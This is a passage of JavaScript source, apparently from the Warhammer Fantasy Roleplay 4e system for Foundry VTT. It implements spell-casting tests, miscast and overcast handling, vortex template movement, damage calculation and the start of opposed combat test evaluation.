        testBreakdown += `<p><strong>${game.i18n.localize("Modifier")}</strong>: ${HandlebarsHelpers.numberFormat(breakdown.modifier, {hash :{sign: true}})}</p>`;
      }

      // No need to show SL value unless it's boosted by slBonus or successBonus
      if (breakdown.slBonus || (breakdown.successBonus && this.succeeded))
      {
        let SLstring = `<p><strong>${game.i18n.localize("SL")}</strong>: ${this.result.baseSL} (Base)`;
        
        if (breakdown.slBonus)
        {
          if (breakdown.slBonus > 0)
          {
            SLstring += ` + ${breakdown.slBonus}`;
          }
          else if (breakdown.slBonus < 0)
          {
            SLstring += ` - ${Math.abs(breakdown.slBonus)}`;
          }
          SLstring += ` (${game.i18n.localize("DIALOG.SLBonus")})`;
        }
        
        if (breakdown.successBonus && this.succeeded)
        {
          if (breakdown.successBonus > 0)
          {
            SLstring += ` + ${breakdown.successBonus}`;
          }
          else if (breakdown.successBonus < 0)
          {
            SLstring += `- ${Math.abs(breakdown.successBonus)}`;
          }
          SLstring += ` (${game.i18n.localize("DIALOG.SuccessBonus")})`;
        }
        testBreakdown += SLstring;
      }

      if (breakdown.modifiersBreakdown)
      {
        testBreakdown += `<hr><h4>${game.i18n.localize("CHAT.ModifiersBreakdown")}</h4>`;
        testBreakdown += breakdown.modifiersBreakdown;
      }

      // @@@@@@@@@@@@@@@@@@ Damage @@@@@@@@@@@@@@@@@@@@
      let damageBreakdown = "";

      damageBreakdown += `<p><strong>${game.i18n.localize("BREAKDOWN.Base")}</strong>: ${breakdown.damage.base}</p>`;
      if (breakdown.damage.item)
      {
        damageBreakdown += `<p><strong>${game.i18n.localize(CONFIG.Item.typeLabels[this.item?.type])}</strong>: ${breakdown.damage.item}</p>`;
      }

      for(let source of breakdown.damage.other)
      {
        damageBreakdown += `<p><strong>${source.label}</strong>: ${HandlebarsHelpers.numberFormat(source.value, {hash: {sign : true}})}`;
      }

      return {test : testBreakdown, damage : damageBreakdown};
    }
    catch(e)
    {
      console.error(`Error generating formatted breakdown: ${e}`, this);
    }

  }

  get message() {
    return game.messages.get(this.context.messageId)
  }
  get isOpposed() {
    return this.context.opposedMessageIds.length > 0
  }
  get opposedMessages() {
    return this.context.opposedMessageIds.map(id => game.messages.get(id))
  }


  get fortuneUsed() {
    return { reroll: this.context.fortuneUsedReroll, SL: this.context.fortuneUsedAddSL }
  }


  get damageEffects() 
  {
      return this.item.damageEffects;
  }

  get targetEffects() 
  {
      return this.item.targetEffects;
  }

  get areaEffects() 
  {
      return this.item.areaEffects;
  }
  

  get targetModifiers() {
    return this.preData.testModifier + this.preData.testDifficulty + (this.preData.postOpposedModifiers.target || 0)
  }

  get succeeded() {
    return this.result.outcome == "success"
  }

  get failed() {
    return this.result.outcome == "failure"
  }

  get isCritical() {
    return this.result.critical
  }

  get isFumble() {
    return this.result.fumble
  }

  get useMount() {
    return this.item.attackType == "melee" && this.actor.isMounted && this.actor.mount && this.result.charging
  }
  
  get target() { return this.data.result.target }
  get successBonus() { return this.data.preData.successBonus }
  get slBonus() { return this.data.preData.slBonus }
  get damage() { return this.data.result.damage }
  get hitloc() { return this.data.result.hitloc }
  get type() { return this.data.type }
  get size() { return this.useMount ? this.actor.mount.details.size.value : this.actor.details.size.value }
  get options() { return this.data.preData.options }
  get outcome() { return this.data.result.outcome }
  get result() { return this.data.result }
  get preData() { return this.data.preData }
  get context() { return this.data.context }
  get actor() { return WFRP_Utility.getSpeaker(this.context.speaker) }
  get token() { return WFRP_Utility.getToken(this.context.speaker) }

  get item() {
    if (typeof this.data.preData.item == "string")
      return this.actor.items.get(this.data.preData.item)
    else
      return new CONFIG.Item.documentClass(this.data.preData.item, { parent: this.actor })
  }

  get targets() {
    return this.context.targets.map(i => WFRP_Utility.getSpeaker(i))
  }

  get doesDamage() {
    return !!this.result.damage || !!this.result.diceDamage || !!this.result.additionalDamage
  }

  get DamageString() {
    let damageElements = [];
    if (this.result.damage) damageElements.push(this.result.damage);
    if (this.result.diceDamage) damageElements.push(`<span title=${this.result.diceDamage.formula}>${this.result.diceDamage.value}</span>`);

    return `(${damageElements.join(" + ")} ${game.i18n.localize("Damage")})`
  }

  get characteristicKey() { return this.preData.characteristic }

  get otherText() { return this.result.other?.length ? this.result.other.join("<br>") : null; }
}

class CastTest extends TestWFRP {

  constructor(data, actor) {
    super(data, actor);
    if (!data)
      return

    this.preData.itemData = data.itemData || this.item.toObject(); // Store item data to avoid rerolls being affected by changed channeled SL
    this.preData.unofficialGrimoire = data.unofficialGrimoire;
    this.data.preData.malignantInfluence = data.malignantInfluence;

    this.data.context.templates = data.templates || [];

    this.computeTargetNumber();
  }

  computeTargetNumber() {

      let skill = this.item.system.getSkillToUse(this.actor);
      if (!skill)
        this.result.target = this.actor.characteristics.int.value;
      else
        this.result.target = skill.total.value;

    super.computeTargetNumber();
  }

  async runPreEffects() {
    await super.runPreEffects();
    await Promise.all(this.actor.runScripts("preRollCastTest", { test: this, chatOptions: this.context.chatOptions }));
    await Promise.all(this.item.runScripts("preRollCastTest", { test: this, chatOptions: this.context.chatOptions }));

    //@HOUSE
    if (this.preData.unofficialGrimoire && this.preData.unofficialGrimoire.ingredientMode == 'power' && this.hasIngredient) { 
      game.wfrp4e.utility.logHomebrew("unofficialgrimoire");
      this.preData.canReverse = true;
    }
    //@HOUSE
  }

  async runPostEffects() {
    await super.runPostEffects();
    await Promise.all(this.actor.runScripts("rollCastTest", { test: this, chatOptions: this.context.chatOptions }));
    await Promise.all(this.item.runScripts("rollCastTest", { test: this, chatOptions: this.context.chatOptions }));
    Hooks.call("wfrp4e:rollCastTest", this, this.context.chatOptions);
  }

  async computeResult() {
    await super.computeResult();

    let miscastCounter = 0;
    let CNtoUse = this.item.cn.value;
    this.result.overcast = foundry.utils.duplicate(this.item.overcast);
    this.result.tooltips.miscast = [];
    
    //@HOUSE
    if (this.preData.unofficialGrimoire && this.result.other.indexOf(game.i18n.localize("ROLL.Reverse")) != -1) {
      if (this.data.result.roll.toString()[this.data.result.roll.toString().length -1] == '8') {
        game.wfrp4e.utility.logHomebrew("unofficialgrimoire");
        miscastCounter++;
        this.result.tooltips.miscast.push(game.i18n.localize("CHAT.PowerIngredientMiscast"));
      }
    }
    //@HOUSE

    // Partial channelling - reduce CN by SL so far
    if (game.settings.get("wfrp4e", "partialChannelling") || game.settings.get("wfrp4e", "useWoMChannelling")) {
      CNtoUse -= this.preData.itemData.system.cn.SL;
      if (CNtoUse < 0)
      {
        CNtoUse = 0;
      }
    }
    // Normal Channelling - if SL has reached CN, CN is considered 0
    else if (this.preData.itemData.system.cn.SL >= this.item.cn.value) {
      CNtoUse = 0;
    }



    // Witchcraft automatically miscast
    if (this.item.lore.value == "witchcraft") {
      miscastCounter++;
      this.result.other.push(game.i18n.localize("CHAT.WitchcraftMiscast"));
      this.result.tooltips.miscast.push(game.i18n.localize("CHAT.AutoWitchcraftMiscast"));
    }

    // slOver is the amount of SL over the CN achieved
    let slOver = (Number(this.result.SL) - CNtoUse);

    // Test itself was failed
    if (this.failed) 
    {
      this.result.castOutcome = "failure";
      this.result.description = game.i18n.localize("ROLL.CastingFailed");
      if (this.preData.itemData.system.cn.SL) {
        miscastCounter++;
        this.result.tooltips.miscast.push(game.i18n.localize("CHAT.ChannellingMiscast"));
      }
      // Miscast on fumble
      if (this.result.roll % 11 == 0 || this.result.roll == 100) {
        this.result.color_red = true;
        this.result.tooltips.miscast.push(game.i18n.localize("CHAT.FumbleMiscast"));
        if (!this.item.system.memorized.value && this.item.system.lore.value != "petty" && game.wfrp4e.tables.findTable("grimoire-miscast"))
        {
          this.result.grimoiremiscast = game.i18n.localize("CHAT.GrimoireMiscast");
        }
        miscastCounter++;
        //@HOUSE
        if (this.result.roll == 100 && game.settings.get("wfrp4e", "mooCatastrophicMiscasts")) {
          game.wfrp4e.utility.logHomebrew("mooCatastrophicMiscasts");
          miscastCounter++;
        }
        //@/HOUSE
      }
      //@/HOUSE
      if (this.preData.unofficialGrimoire && this.preData.unofficialGrimoire.overchannelling > 0) { 
        game.wfrp4e.utility.logHomebrew("overchannelling");
        this.result.tooltips.miscast.push(game.i18n.localize("CHAT.OverchannellingMiscast"));
        miscastCounter++;
      }
      //@/HOUSE
    }
    else if (slOver < 0) // Successful test, but unable to cast due to not enough SL
    {
      this.result.castOutcome = "failure";
      this.result.description = game.i18n.localize("ROLL.CastingFailed");
      //@/HOUSE
      if (this.preData.unofficialGrimoire && this.preData.unofficialGrimoire.overchannelling > 0) { 
        game.wfrp4e.utility.logHomebrew("overchannelling");
        this.result.tooltips.miscast.push(game.i18n.localize("CHAT.OverchannellingMiscast"));
        miscastCounter++;
      }
      //@/HOUSE
      // Critical Casting - succeeds only if the user chooses Total Power option (which is assumed)
      if (this.result.roll % 11 == 0) {
        this.result.color_green = true;
        this.result.castOutcome = "success";
        this.result.description = game.i18n.localize("ROLL.CastingSuccess");
        this.result.critical = game.i18n.localize("ROLL.TotalPower");
        this.result.totalPower = true;
        this.result.tooltips.miscast.push(game.i18n.localize("CHAT.TotalPowerMiscast"));
        miscastCounter++;
      }
    }

    else // Successful test, casted - determine overcast
    {
      this.result.castOutcome = "success";
      this.result.description = game.i18n.localize("ROLL.CastingSuccess");
      //@/HOUSE
      if (this.preData.unofficialGrimoire && this.preData.unofficialGrimoire.overchannelling > 0) {
        game.wfrp4e.utility.logHomebrew("overchannelling");
        slOver += this.preData.unofficialGrimoire.overchannelling;
      }
      //@/HOUSE

      if (this.result.roll % 11 == 0) {
        this.result.critical = game.i18n.localize("ROLL.CritCast");
        this.result.color_green = true;
        this.result.tooltips.miscast.push(game.i18n.localize("CHAT.CritCastMiscast"));
        if (this.preData.totalPower)
        {
          this.result.critical = game.i18n.localize("ROLL.TotalPower");
          this.result.totalPower = true;
        }
        miscastCounter++;
      }

      //@HOUSE
      if (game.settings.get("wfrp4e", "mooCriticalChannelling")) {
        game.wfrp4e.utility.logHomebrew("mooCriticalChannelling");
        if (this.spell.flags.criticalchannell && CNtoUse == 0) {
          this.result.SL = "+" + Number(this.result.SL) + this.item._source.system.cn.value;
          this.result.other.push(game.i18n.localize("MOO.CriticalChanelling"));
        }
      }
      //@/HOUSE
    }
    //@HOUSE
    if (this.preData.unofficialGrimoire && this.preData.unofficialGrimoire.quickcasting && miscastCounter > 0) { 
      game.wfrp4e.utility.logHomebrew("quickcasting");
      this.result.other.push(game.i18n.localize("CHAT.Quickcasting"));
      miscastCounter++;
    }
    //@/HOUSE
    
    miscastCounter += this._checkInfluences() || 0;
    this._calculateOverCast(slOver);
    this._handleMiscasts(miscastCounter);
    await this.calculateDamage();
    this.result.slOver = slOver;

    // TODO handle all tooltips (when they are added) in one place
    // TODO Fix weird formatting in tooltips (indenting)
    this.result.tooltips.miscast = this.result.tooltips.miscast.join("\n");

    return this.result;
  }

  _checkInfluences()
  {
    if (!this.preData.malignantInfluence) 
    {
      return 0
    }

    // If malignant influence AND roll has an 8 in the ones digit, miscast
    if (
      (Number(this.result.roll.toString().split('').pop()) == 8 && !game.settings.get("wfrp4e", "useWoMInfluences")) || 
      (this.failed && game.settings.get("wfrp4e", "useWoMInfluences"))) 
    {
      this.result.tooltips.miscast.push(game.i18n.localize("CHAT.MalignantInfluence"));
      return 1;
    }
  }

  _calculateOverCast(slOver) {
    this.result.overcasts = Math.max(0, Math.floor(slOver / 2));
    this.result.overcast.total = this.result.overcasts;
    this.result.overcast.available = this.result.overcasts;
  }

  async calculateDamage() {
    let damageBreakdown = this.result.breakdown.damage;
    this.result.additionalDamage = this.preData.additionalDamage || 0;
    // Calculate Damage if the this.item has it specified and succeeded in casting
    try {
      if (this.item.Damage && this.result.castOutcome == "success")
      {
        this.result.damage = Number(this.result.SL) + Number(this.item.Damage);
        damageBreakdown.base = `${this.item.Damage} (${game.i18n.localize("Spell")})`;
        damageBreakdown.other.push({label : game.i18n.localize("SL"), value : this.result.SL });
      }

      if (this.item.damage.dice && !this.result.additionalDamage) {
        let roll = await new Roll(this.item.damage.dice).roll();
        this.result.diceDamage = { value: roll.total, formula: roll.formula };
        this.preData.diceDamage = this.result.diceDamage;
        this.result.additionalDamage += roll.total;
        damageBreakdown.other.push({label : game.i18n.localize("BREAKDOWN.Dice"), value : roll.total});
      this.preData.additionalDamage = this.result.additionalDamage;
      }
    }
    catch (error) {
      ui.notifications.error(game.i18n.localize("ErrorDamageCalc") + ": " + error);
    } // If something went wrong calculating damage, do nothing and continue

  }

  
  async moveVortex() 
  {
    for (let id of this.context.templates) {
      let template = canvas.scene.templates.get(id);
      if (template) {

        let tableRoll = (await game.wfrp4e.tables.rollTable("vortex", {}, "map"));
        let dist = (await new Roll("2d10").roll()).total;
        let pixelsPerYard = canvas.scene.grid.size / canvas.scene.grid.distance;
        let straightDelta = dist * pixelsPerYard;
        let diagonalDelta = straightDelta / Math.sqrt(2);
        tableRoll.result = tableRoll.result.replace("[[2d10]]", dist);

        if (tableRoll) {
          let { x, y } = template || {};
          ChatMessage.create({ content: tableRoll.result, speaker: { alias: this.item.name } });
          if (tableRoll.roll == 1) {
            await template?.delete();
            this.context.templates = this.context.templates.filter(i => i != id);
            await this.updateMessageFlags();
            continue;
          }
          else if (tableRoll.roll == 2) {
            y -= straightDelta;
          }
          else if (tableRoll.roll == 3) {
            y -= diagonalDelta;
            x += diagonalDelta;
          }
          else if (tableRoll.roll == 4) {
            x += straightDelta;
          }
          else if (tableRoll.roll == 5) ;
          else if (tableRoll.roll == 6) {
            y += diagonalDelta;
            x += diagonalDelta;
          }
          else if (tableRoll.roll == 7) {
            y += straightDelta;
          }
          else if (tableRoll.roll == 8) {
            y += diagonalDelta;
            x -= diagonalDelta;
          }
          else if (tableRoll.roll == 9) {
            x -= straightDelta;
          }
          else if (tableRoll.roll == 10) {
            y -= diagonalDelta;
            x -= diagonalDelta;
          }
          template.update({ x, y }).then(template => {
            // AbilityTemplate.updateAOETargets(template);
          });
        }
      }
    }
  }


  async postTest() {
    //@/HOUSE
    if (this.preData.unofficialGrimoire) {
      game.wfrp4e.utility.logHomebrew("unofficialgrimoire");
      if (this.preData.unofficialGrimoire.ingredientMode != 'none' && this.hasIngredient && this.item.ingredient?.quantity.value > 0 && !this.context.edited && !this.context.reroll) {
        await this.item.ingredient.update({ "system.quantity.value": this.item.ingredient.quantity.value - 1 });
        ChatMessage.create({ speaker: this.context.speaker, content: game.i18n.localize("ConsumedIngredient") });
      }
    //@/HOUSE
    } else {
      // Find ingredient being used, if any
      if (this.hasIngredient && this.item.ingredient?.quantity.value > 0 && !this.context.edited && !this.context.reroll)
        await this.item.ingredient.update({ "system.quantity.value": this.item.ingredient.quantity.value - 1 });
    }

    // Set initial extra overcasting options to SL if checked
    if (this.result.overcast.enabled) {
      if (this.item.system.overcast.initial.type == "SL") {
        foundry.utils.setProperty(this.result, "overcast.usage.other.initial", parseInt(this.result.SL) + (parseInt(this.item.system.computeSpellPrayerFormula("", false, this.spell.system.overcast.initial.additional)) || 0));
        foundry.utils.setProperty(this.result, "overcast.usage.other.current", parseInt(this.result.SL) + (parseInt(this.item.system.computeSpellPrayerFormula("", false, this.spell.system.overcast.initial.additional)) || 0));
      }
    }

    if (this.result.miscastModifier) {
      if (this.result.minormis)
        this.result.minormis += ` (${this.result.miscastModifier})`;
      if (this.result.majormis)
        this.result.majormis += ` (${this.result.miscastModifier})`;
      if (this.result.catastrophicmis)
        this.result.catastrophicmis += ` (${this.result.miscastModifier})`;
    }

    //@HOUSE
    if (this.item.cn.SL > 0) {

      if (this.result.castOutcome == "success" || !game.settings.get("wfrp4e", "mooCastAfterChannelling"))
      {
        let items = [this.item];

        // If WoM Channelling, SL of spells are shared, so remove all channelled SL of spells with the same lore
        if (game.settings.get("wfrp4e", "useWoMChannelling"))
        {
          items = this.actor.items.filter(s => s.type == "spell" && s.system.lore.value == this.spell.system.lore.value).map(i => i.toObject());
          items.forEach(i => i.system.cn.SL = 0);
          await this.actor.updateEmbeddedDocuments("Item", items);
        }
        else 
        {
          await this.item.update({ "system.cn.SL": 0 });
        }
      }

      else if (game.settings.get("wfrp4e", "mooCastAfterChannelling")) {
        game.wfrp4e.utility.logHomebrew("mooCastAfterChannelling");
        if (this.item.cn.SL > 0 && this.result.castOutcome == "failure")
          this.result.other.push(game.i18n.localize("MOO.FailedCast"));
      }
    }
    //@/HOUSE
  }

  get hasIngredient() {
    return this.item.ingredient && this.item.ingredient.quantity.value > 0
  }

  get effects() {
    let effects = super.effects;
    if (this.item.system.lore.effect?.application == "apply")
      effects.push(this.item.system.lore.effect);
    return effects
  }


  get spell() {
    return this.item
  }
}

class WomCastTest extends CastTest {

  // WoM overcasts need to check availability per usage option
  // Look at each usage's first option and see if the cost can be paid
  // If not, it is not available
  _calculateOverCast(slOver) {

    this.result.overcasts = Math.max(0, slOver) + (this.result.totalPower ? parseInt(Math.floor(this.result.roll / 10)) : 0);    
    this.result.overcast.total = this.result.overcasts;
    this.result.overcast.available = this.result.overcasts;

    // Since SL is spent by overcasts, need to keep track of original
    this.result.overcast.originalSL = Number(this.result.SL); 

    if (this.result.overcast.usage.range) {
      this.result.overcast.usage.range.available = this.result.overcast.available >= game.wfrp4e.config.overCastTable.range[0].cost;
    }
    if (this.result.overcast.usage.target) {
      if(this.result.overcast.usage.target.AoE) {
        this.result.overcast.usage.target.available = this.result.overcast.available >= game.wfrp4e.config.overCastTable.AoE[0].cost;
      } else {
        this.result.overcast.usage.target.available = this.result.overcast.available >= game.wfrp4e.config.overCastTable.target[0].cost;
      }
    }
    if (this.result.overcast.usage.duration) {
      this.result.overcast.usage.duration.available = this.result.overcast.available >= game.wfrp4e.config.overCastTable.duration[0].cost;
    }
    if (this.result.overcast.usage.damage) {
      this.result.overcast.usage.damage.available = this.result.overcast.available >= game.wfrp4e.config.overCastTable.damage[0].cost;
    }
    if (this.result.overcast.usage.other) {
      this.result.overcast.usage.other.available = this.result.overcast.available >= 2;
    }
  }

  async calculateDamage() {
    let damageBreakdown = this.result.breakdown.damage;
    this.result.additionalDamage = this.preData.additionalDamage || 0;
    // Calculate Damage if the this.item has it specified and succeeded in casting
    try {
      if (this.item.Damage && this.result.castOutcome == "success") {
        this.result.damage = Number(this.item.Damage);
        damageBreakdown.base = `${this.item.Damage} (${game.i18n.localize("Spell")})`;

        if (this.result.overcast.usage.damage && this.result.overcast.usage.damage.count > 0) {
          let overcastDamage = game.wfrp4e.config.overCastTable.damage[this.result.overcast.usage.damage.count - 1].value;
          this.result.additionalDamage += overcastDamage;
          damageBreakdown.other.push({label : game.i18n.localize("Overcast"), value : overcastDamage});
          this.result.damage += this.result.additionalDamage;
        }
      }
      if (this.item.damage.dice && !this.result.additionalDamage) {
        let roll = await new Roll(this.item.damage.dice).roll();
        this.result.diceDamage = { value: roll.total, formula: roll.formula };
        this.preData.diceDamage = this.result.diceDamage;
        this.result.additionalDamage += roll.total;
        damageBreakdown.other.push({label : game.i18n.localize("BREAKDOWN.Dice"), value : roll.total});
        this.preData.additionalDamage = this.result.additionalDamage;
      }
    }
    catch (error) {
      ui.notifications.error(game.i18n.localize("ErrorDamageCalc") + ": " + error);
    } // If something went wrong calculating damage, do nothing and continue
  }


  // @@@@@@@ Overcast functions placed in root class because it is used by both spells and prayers @@@@@@@
  async _overcast(choice) {
    if (!game.settings.get("wfrp4e", "useWoMOvercast")) {
      await super._overcast(choice);
    } else {
      const overcastData = this.result.overcast;

      if (!overcastData.available)
        return overcastData

      if (typeof overcastData.usage[choice].initial != "number")
        return overcastData

      const overCastTable = game.wfrp4e.config.overCastTable;
      const count = overcastData.usage[choice].count;


      // If no table entry, or costs more than SL available, do nothing
      // AoE is separate column from target, so must be tested separately 
      if (choice == "target" && overcastData.usage.target.AoE) {
        if (!overCastTable["AoE"][count] || overCastTable["AoE"][count].cost > overcastData.available) {
          return overcastData;
        }
      } 
      // Other options are not in the table, so assume cost is 2 per original rules
      else if (choice == "other") {
        if (2 > overcastData.available)
          return overcastData
      }
      else {
        if (!overCastTable[choice][count] || overCastTable[choice][count].cost > overcastData.available) {
          return overcastData;
        }
      }

      // Set current value based on overcast choice
      switch (choice) {
        case "range":
          if (overCastTable[choice][count] && overCastTable[choice][count].cost <= overcastData.available) {
            overcastData.usage[choice].current = overCastTable[choice][count].value * overcastData.usage[choice].initial;
          }
          break
        case "target":
          if (overcastData.usage["target"].AoE) {
            if (overCastTable[choice][count] && overCastTable["AoE"][count].cost <= overcastData.available) {
              overcastData.usage[choice].current = overCastTable["AoE"][count].value * overcastData.usage[choice].initial;
            }
          } else {
            if (overCastTable[choice][count] && overCastTable["target"][count].cost <= overcastData.available) {
              overcastData.usage[choice].current = overCastTable["target"][count].value + overcastData.usage[choice].initial;
            }
          }
          break
        case "duration":
          if (overCastTable[choice][count] && overCastTable[choice][count].cost <= overcastData.available) {
            overcastData.usage[choice].current = overCastTable[choice][count].value * overcastData.usage[choice].initial;
          }
          break
        case "damage": 
        if (overCastTable[choice][count] && overCastTable[choice][count].cost <= overcastData.available) {
          overcastData.usage[choice].current = overCastTable[choice][count].value + overcastData.usage[choice].initial;
        }
          break
        case "other":
          if (overcastData.valuePerOvercast.type == "value")
            overcastData.usage[choice].current += overcastData.valuePerOvercast.value;
          else if (overcastData.valuePerOvercast.type == "SL")
            overcastData.usage[choice].current += (parseInt(this.result.SL) + (parseInt(this.item.system.computeSpellPrayerFormula(undefined, false, overcastData.valuePerOvercast.additional)) || 0));
          else if (overcastData.valuePerOvercast.type == "characteristic")
            overcastData.usage[choice].current += (overcastData.usage[choice].increment || 0); // Increment is specialized storage for characteristic data so we don't have to look it up
          break
      }


      // Subtract cost of overcasting from available SL
      // AoE is separate column from target, so must be tested separately 
      if (choice == "target" && overcastData.usage.target.AoE) {
        overcastData.available = overcastData.available - overCastTable["AoE"][count].cost;
      } 
      else if (choice == "other") {
        overcastData.available = overcastData.available - 2;
      }
      else {
        overcastData.available = overcastData.available - overCastTable[choice][count].cost;
      }

      overcastData.usage[choice].count++;

      // Check if options are still available for more overcasting (now that count is incremented)
      // It is not available if 1). no more entries in the table or 2). not enough available SL
      if (overcastData.usage.range) {
        overcastData.usage.range.available = overCastTable.range[overcastData.usage.range.count] && overcastData.available >= overCastTable.range[overcastData.usage.range.count].cost;
      }
      if (overcastData.usage.target) {
        if (overcastData.usage.target.AoE) {
          overcastData.usage.target.available = overCastTable.AoE[overcastData.usage.target.count] && overcastData.available >= overCastTable.AoE[overcastData.usage.target.count].cost;
        } else {          
          overcastData.usage.target.available = overCastTable.target[overcastData.usage.target.count] && overcastData.available >= overCastTable.target[overcastData.usage.target.count].cost;
        }
      }
      if (overcastData.usage.duration) {
        overcastData.usage.duration.available = overCastTable.duration[overcastData.usage.duration.count] && overcastData.available >= overCastTable.duration[overcastData.usage.duration.count].cost;
      }
      if (overcastData.usage.damage) {
        overcastData.usage.damage.available = overCastTable.damage[overcastData.usage.damage.count] && overcastData.available >= overCastTable.damage[overcastData.usage.damage.count].cost;
      }

      // Subtract SL by the amount spent on overcasts
      // Math.max is for preventing negative SL, this occurs with Dhar overcast rules from, which don't really work well with WoM overcast
      this.data.result.SL = `+${Math.max(0, overcastData.originalSL - (overcastData.total - overcastData.available))}`;
      await this.calculateDamage();
      await this.updateMessageFlags();
      this.renderRollCard();
    }
  }

  async _overcastReset() {
    if (!game.settings.get("wfrp4e", "useWoMOvercast")) {
      await super._overcastReset();
    } else {
      let overcastData = this.result.overcast;
      overcastData.available = overcastData.total;

      // For each usage option, set count to 0, reset current value to initial, and check availability
      for (let overcastType in overcastData.usage) {
        if (overcastData.usage[overcastType]) {
          overcastData.usage[overcastType].count = 0;
          overcastData.usage[overcastType].current = overcastData.usage[overcastType].initial;

          if (overcastType == "other") {
            overcastData.usage[overcastType].available = overcastData.available >= 2;
          }
          else if(overcastType == "target" && overcastData.usage.target.AoE) {
            overcastData.usage[overcastType].available = overcastData.available >= game.wfrp4e.config.overCastTable.AoE[0].cost;
          } 
          else {
            overcastData.usage[overcastType].available = overcastData.available >= game.wfrp4e.config.overCastTable[overcastType][0].cost;
          }
        }
      }

      this.data.result.additionalDamage = this.preData.additionalDamage || 0;
      this.data.result.SL = `+${overcastData.originalSL}`;
      await this.calculateDamage();
      this.renderRollCard();
    }
  }
}

class OpposedTest {
  constructor(attackerTest = undefined, defenderTest = undefined, opposeResult = {}) {
    this.data = {
      attackerTestData : attackerTest?.data,
      defenderTestData : defenderTest?.data,
      opposeResult
    };

    this.attackerTest = attackerTest;
    this.defenderTest = defenderTest;
  }
  get opposeResult() { return this.data.opposeResult }
  get result() { return this.data.opposeResult }
  get attacker() { return this.attackerTest.actor }
  get defender() { return this.defenderTest.actor }

  static recreate(data)
  {
    let opposedTest = new OpposedTest();
    opposedTest.data = data;
    opposedTest.createAttackerTest(data.attackerTestData);
    opposedTest.createDefenderTest(data.defenderTestData);
    return opposedTest;
  }

  _createTest(testData) {
    if (!testData)
      return testData
    let test = game.wfrp4e.rolls.TestWFRP.recreate(testData);
    test.data = testData;
    return test
  }

  createAttackerTest(testData) {
    this.attackerTest = this._createTest(testData);
    this.data.attackerTestData = testData;
  }

  createDefenderTest(testData) {
    this.defenderTest = this._createTest(testData);
    this.data.defenderTestData = testData;
  }

  createUnopposedDefender(actor) {
    this.defenderTest = new game.wfrp4e.rolls.CharacteristicTest({
      item: "ws",
      SL: 0,
      target: 0,
      roll: 0,
      unopposedTarget: true,
    }, actor);
    this.defenderTest.data.context.unopposed = true;
    this.data.defenderTestData = this.defenderTest.data;
  }


  /*Known Bugs: attempting to reroll causes it to not reroll at all, actually. Manually editing cards causes a duplicate result card at the end.
*
*
*
*/
  checkPostModifiers() {

    let didModifyAttacker = false;

    let modifiers = {
      attacker: {
        target: 0,
        SL: 0
      },
      defender: {
        target: 0,
        SL: 0
      },
      message: []
    };

    // Things to Check:
    // Weapon Length DONE
    // Fast Weapon Property DONE
    // Size 
    // Done - Weapon Defending: You suﬀer a penalty of –2 SL for each step larger your opponent is when using Melee to defend an Opposed Test
    // Done - To Hit Modifiers: +10 Bonus if smaller
    // Done - Ranged to Hit Modifiers : You gain a hefty bonus when shooting at larger targets (Ex. +40 to hit Enormous).
    //Shooting at smaller targets?

    if (game.settings.get("wfrp4e", "weaponLength") && this.attackerTest.weapon && this.defenderTest.weapon && this.attackerTest.weapon.attackType == "melee" && this.defenderTest.weapon.attackType == "melee") {
      let attackerReach = this.attackerTest.item.reachNum;
      let defenderReach = this.defenderTest.item.reachNum;
      if (defenderReach > attackerReach && !this.attackerTest.result.infighter) {
        didModifyAttacker = true;
        modifiers.message.push(game.i18n.format(game.i18n.localize('CHAT.TestModifiers.WeaponLength'), { defender: this.defenderTest.actor.prototypeToken.name, attacker: this.attackerTest.actor.prototypeToken.name }));
        modifiers.attacker.target += -10;
      }
    }

    return foundry.utils.mergeObject(modifiers, { didModifyAttacker });
  }

  /**
    * Main Opposed test evaluation logic. Takes attacker and defender test data and 
    * determines who won, by how much, etc. Displays who won accordingly, with different
    * logic for manual and targeted opposed tests
    * 
    * @param {Object} attacker Attacker data
    * @param {Object} defender Defender Data
    * @param {Object} options Targeted?
    */
  async evaluate() {
    try {
      let opposeResult = this.result;
      let attackerTest = this.attackerTest;
      let defenderTest = this.defenderTest;

      let soundContext = {};
      opposeResult.other = [];


      let attacker = this.attackerTest.actor;
      let defender = this.defenderTest.actor;


      await Promise.all(attacker.runScripts("preOpposedAttacker", { attackerTest, defenderTest, opposedTest: this }));
      await Promise.all(attackerTest.item?.runScripts?.("preOpposedAttacker", { attackerTest, defenderTest, opposedTest: this }) ?? []);
      await Promise.all(defender.runScripts("preOpposedDefender", { attackerTest, defenderTest, opposedTest: this }));
      await Promise.all(defenderTest.item?.runScripts?.("preOpposedDefender", { attackerTest, defenderTest, opposedTest: this }) ?? []);


      opposeResult.modifiers = this.checkPostModifiers(attackerTest, defenderTest);

      // Redo the test with modifiers
      if (opposeResult.modifiers.didModifyAttacker) {
        attackerTest.preData.roll = attackerTest.result.roll;
        attackerTest.preData.postOpposedModifiers = opposeResult.modifiers.attacker;
        attackerTest.preData.hitloc = attackerTest.result.hitloc?.roll;
        await attackerTest.computeResult();
        await attackerTest.renderRollCard();
      }

      if (defenderTest.context.unopposed)
      {
        await defenderTest.roll();
      }

      opposeResult.other = opposeResult.other.concat(opposeResult.modifiers.message);

      let attackerSL = parseInt(attackerTest.result.SL ?? 0);
      let defenderSL = parseInt(defenderTest.result.SL ?? 0);
      opposeResult.differenceSL = 0;

      // If attacker has more SL OR the SLs are equal and the attacker's target number is greater than the defender's, then attacker wins. 
      // Note: I know this isn't technically correct by the book, where it states you use the tested characteristic/skill, not the target number, i'll be honest, I don't really care.
      if (attackerSL > defenderSL || (attackerSL === defenderSL && (attackerTest.target > defenderTest.target || (attackerTest.outcome == "success" && defenderTest.context.unopposed)))) {
        opposeResult.winner = "attacker";
        opposeResult.differenceSL = attackerSL - defenderSL;

        // If Damage is a numerical value
        if (Number.isNumeric(attackerTest.damage)) {
          let damage = await this.calculateOpposedDamage();
          opposeResult.damage = {
            description: `<b>${game.i18n.localize("Damage")}</b>: ${damage}`,
            value: damage
          };
        }
        // If attacker is using a weapon or trait but there wasn't a numerical damage value, output unknown
        else if (attackerTest.weapon || attackerTest.trait) {
          opposeResult.damage = {
            description: `<b>${game.i18n.localize("Damage")}</b>: ?`,
            value: null
          };
        }
        if (attackerTest.hitloc) 
        {
          await this.findHitLocation();
        }

        if (opposeResult.breakdown) {
          opposeResult.breakdown.formatted = this.formatBreakdown();
        }

        try // SOUND
        {
          if (attackerTest.weapon.weaponGroup.value === "bow"
            || attackerTest.weapon.weaponGroup.value === "crossbow") {
            soundContext = { item: attackerTest.weapon, action: "hit" };
          }
          if (attackerTest.weapon.weaponGroup.value == "throwing") {
